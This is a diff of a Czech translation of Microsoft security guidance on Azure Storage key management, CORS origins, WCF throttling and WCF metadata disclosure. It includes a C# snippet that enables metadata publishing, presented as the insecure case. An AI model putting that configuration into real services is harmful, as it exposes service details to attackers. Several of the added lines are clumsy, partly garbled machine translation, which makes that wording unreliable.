 | **Fáze SDL**               | Nasazení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Azure Storage Průvodce zabezpečením – Správa klíčů účtu úložiště](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
-| **Kroky** | <p>Úložiště klíčů: doporučuje se ukládat přístupové klíče Azure Storage do Azure Key Vault jako tajný kód a nechat aplikace získat klíč z trezoru klíčů. Tento postup je doporučený z následujících důvodů:</p><ul><li>Aplikace nikdy nebude mít klíč úložiště pevně zakódované v konfiguračním souboru. tím se odstraní tento způsob někoho, kdo získá přístup k klíčům bez konkrétního oprávnění.</li><li>Přístup ke klíčům lze ovládat pomocí Azure Active Directory. To znamená, že vlastník účtu může udělit přístup k několik aplikacím, které potřebují načíst klíče z Azure Key Vault. Ostatní aplikace nebudou mít přístup ke klíčům bez udělení oprávnění výslovně.</li><li>Opětovné vytvoření klíče: doporučuje se, abyste měli k dispozici proces pro opětovné vygenerování přístupových klíčů úložiště Azure z bezpečnostních důvodů. Podrobnosti o tom, proč a jak naplánovat vygenerování klíčů, najdete v článku Referenční příručka zabezpečení Azure Storage</li></ul>|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Průvodce zabezpečením úložiště Azure – správa klíčů účtu úložiště](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
+| **Kroky** | <p>Úložiště klíčů: Doporučujeme uložit přístupové klíče úložiště Azure v Azure Key Vault jako tajný klíč a mít aplikace načíst klíč z trezoru klíčů. To se doporučuje z následujících důvodů:</p><ul><li>Aplikace nikdy nebude mít klíč úložiště pevně zakódovaný v konfiguračním souboru, který odstraní, že avenue někdo získat přístup ke klíčům bez konkrétního oprávnění</li><li>Přístup ke klíčům lze řídit pomocí služby Azure Active Directory. To znamená, že vlastník účtu může udělit přístup k hrstce aplikací, které potřebují načíst klíče z Azure Key Vault. Jiné aplikace nebudou mít přístup ke klíčům bez udělení oprávnění konkrétně</li><li>Regenerace klíčů: Doporučujeme mít zavedený proces pro obnovení přístupových klíčů úložiště Azure z bezpečnostních důvodů. Podrobnosti o tom, proč a jak plánovat regeneraci klíčů jsou popsány v referenčním článku průvodce zabezpečením úložiště Azure</li></ul>|
 
-## <a id="cors-storage"></a>Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v Azure Storage povolené CORS.
+## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Ujistěte se, že jsou povoleny pouze důvěryhodné původy, pokud je cors povolena v úložišti Azure
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Azure Storage | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Podpora CORS pro služby Azure Storage Services](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
-| **Kroky** | Azure Storage umožňuje povolit CORS – mezi zdroji sdílení prostředků. Pro každý účet úložiště můžete zadat domény, které budou mít přístup k prostředkům v daném účtu úložiště. Ve výchozím nastavení je CORS ve všech službách zakázaná. CORS můžete povolit pomocí REST API nebo klientské knihovny úložiště pro volání jedné z metod pro nastavení zásad služby. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Podpora CORS pro služby Azure Storage](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
+| **Kroky** | Azure Storage umožňuje povolit CORS – Cross Origin sdílení prostředků. Pro každý účet úložiště můžete zadat domény, které mají přístup k prostředkům v tomto účtu úložiště. Ve výchozím nastavení je cors zakázán ve všech službách. Cors můžete povolit pomocí rozhraní REST API nebo knihovny klienta úložiště volat jednu z metod pro nastavení zásad služby. |
 
-## <a id="throttling"></a>Povolit funkci omezování služby WCF
+## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Povolit funkci omezení služeb WCF
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | WCF | 
 | **Fáze SDL**               | Sestavení |  
-| **Použitelné technologie** | .NET Framework 3 |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [obohacení království](https://vulncat.fortify.com) |
-| **Kroky** | <p>Omezení použití systémových prostředků by mohlo vést k vyčerpání prostředků a nakonec k odepření služby.</p><ul><li>**Vysvětlení:** Windows Communication Foundation (WCF) nabízí možnost omezit žádosti o služby. Povolení příliš velkého počtu žádostí klienta může naplavit systém a vyčerpat jeho prostředky. Na druhé straně může být povolení jenom malého počtu požadavků ke službě zabránit legitimním uživatelům v používání služby. Každá služba by měla být individuálně vyladěna a nakonfigurována tak, aby umožňovala odpovídající množství prostředků.</li><li>**Doporučení** Povolte funkci omezování služby WCF a nastavte limity vhodné pro vaši aplikaci.</li></ul>|
+| **Použitelné technologie** | Rozhraní .NET Framework 3 |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Opevnitkrálovství](https://vulncat.fortify.com) |
+| **Kroky** | <p>Neomezení použití systémových prostředků by mohlo vést k vyčerpání prostředků a nakonec k odmítnutí služby.</p><ul><li>**VYSVĚTLENÍ:** Windows Communication Foundation (WCF) nabízí možnost omezení požadavků na služby. Povolení příliš mnoha požadavků klientů může zaplavit systém a vyčerpat jeho prostředky. Na druhou stranu povolení pouze malého počtu požadavků na službu může bránit oprávněným uživatelům v používání služby. Každá služba by měla být individuálně naladěna a nakonfigurována tak, aby umožňovala odpovídající množství prostředků.</li><li>**DOPORUČENÍ** Povolte funkci omezení služby WCF a nastavte limity vhodné pro vaši aplikaci.</li></ul>|
 
 ### <a name="example"></a>Příklad
 Následuje příklad konfigurace s povoleným omezením:
@@ -623,29 +623,29 @@ Následuje příklad konfigurace s povoleným omezením:
 </system.serviceModel> 
 ```
 
-## <a id="info-metadata"></a>WCF – zpřístupnění informací prostřednictvím metadat
+## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-Information disclosure prostřednictvím metadat
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | WCF | 
 | **Fáze SDL**               | Sestavení |  
-| **Použitelné technologie** | .NET Framework 3 |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [obohacení království](https://vulncat.fortify.com) |
-| **Kroky** | Metadata můžou útočníkům pomáhat se systémem a naplánovat formu útoku. Služby WCF je možné nakonfigurovat tak, aby vystavily metadata. Metadata poskytují podrobné informace o popisu služby a neměly by se vysílat v produkčních prostředích. Vlastnosti `HttpGetEnabled` / `HttpsGetEnabled` třídy oddílu serviceMetadata definují, zda bude služba vystavovat metadata. | 
+| **Použitelné technologie** | Rozhraní .NET Framework 3 |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Opevnitkrálovství](https://vulncat.fortify.com) |
+| **Kroky** | Metadata mohou útočníkům pomoci seznámit se se systémem a naplánovat formu útoku. Služby WCF lze nakonfigurovat tak, aby zpřístupňovaly metadata. Metadata poskytují podrobné informace o popisu služby a neměla by být vysílána v produkčním prostředí. Vlastnosti `HttpGetEnabled`  /  `HttpsGetEnabled` třídy ServiceMetaData definují, zda služba zpřístupní metadata | 
 
 ### <a name="example"></a>Příklad
-Následující kód dá WCF, aby vysílaly metadata služby.
+Níže uvedený kód instruuje WCF k vysílání metadat služby
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
 smb.HttpGetEnabled = true; 
 smb.HttpGetUrl = new Uri(EndPointAddress); 
 Host.Description.Behaviors.Add(smb); 
 ```
-Nevytvářejte metadata služby v produkčním prostředí. Nastavte vlastnosti HttpGetEnabled/HttpsGetEnabled třídy oddílu serviceMetadata na hodnotu false. 
+Nevysílat metadata služby v produkčním prostředí. Nastavte vlastnosti HttpGetEnabled / HttpsGetEnabled třídy ServiceMetaData na hodnotu false. 
 
 ### <a name="example"></a>Příklad
-Následující kód vydá pokyn WCF, aby nevysílal metadata služby. 
+Níže uvedený kód instruuje WCF nevysílat metadata služby. 
 ```
 ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
 smb.HttpGetEnabled = false; 
